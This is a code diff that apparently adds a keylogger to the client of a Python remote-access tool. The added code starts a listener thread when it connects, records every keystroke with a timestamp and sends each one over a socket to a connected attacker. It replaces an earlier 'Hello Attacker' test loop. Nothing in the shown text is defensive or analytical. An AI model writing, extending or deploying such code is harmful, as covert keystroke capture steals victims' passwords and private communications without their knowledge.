@@ -1,5 +1,9 @@
 import socket
 import struct
+import threading
+from datetime import datetime
+from pynput.keyboard import Listener
+
 
 
 class Target():
@@ -13,12 +17,33 @@ class Main():
     def __init__(self, client_socket):
         self.client_socket = client_socket
         SuperSocket(self.client_socket).send_msg(("0").encode())
-        self.operation()
+        threading.Thread(target=self.keylogger,
+                             args=()).start()
 
-    def operation(self):
-        while True:
-            SuperSocket(self.client_socket).send_msg(
-                ("Hello Attacker").encode())
+    def keylogger(self):
+        Keylogger(self.client_socket)
+
+class Keylogger():
+    def __init__(self, client_socket):
+        self.client_socket = client_socket
+        self.n = 0
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
+
+    def on_press(self, key):
+        self.n = self.n+1
+
+    def on_release(self, key):
+        if self.n > 3:
+            now = datetime.now()
+            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: long {format(key)}\n").encode())
+            self.n = 0
+        else:
+            now = datetime.now()
+            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: {format(key)}\n").encode())
+            self.n = 0
 
 
 class SuperSocket():
